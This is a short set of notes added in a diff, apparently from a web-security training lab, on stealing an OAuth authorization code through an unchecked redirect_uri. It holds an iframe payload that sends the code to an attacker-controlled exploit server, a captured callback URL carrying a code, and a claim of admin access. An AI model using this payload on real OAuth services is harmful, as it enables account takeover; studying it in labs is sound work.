@@ -1,0 +1,14 @@
+analysis:
+    use oauth social media
+    vulnerable to redirec_uri
+
+try to embbed in our exploit website to get code token
+so we access to this 
+
+our payload:
+    <iframe src="https://oauth-0a5c00b103adc172c036521202660075.oauth-server.net/auth?client_id=f0e87y50cldwtvw3qfv1w&redirect_uri=https://exploit-0a8e00ab03c7c1adc064537d01b9007a.exploit-server.net/exploit&response_type=code&scope=openid%20profile%20email"></iframe>
+
+    https://0a23008c0305c1b3c01954a9006c00ec.web-security-academy.net/oauth-callback?code=nI6yDJoqo5kVNZXe0x9wYBKBSEm3Zfiay4uQyTgiKTj
+
+
+and success login to admin panel
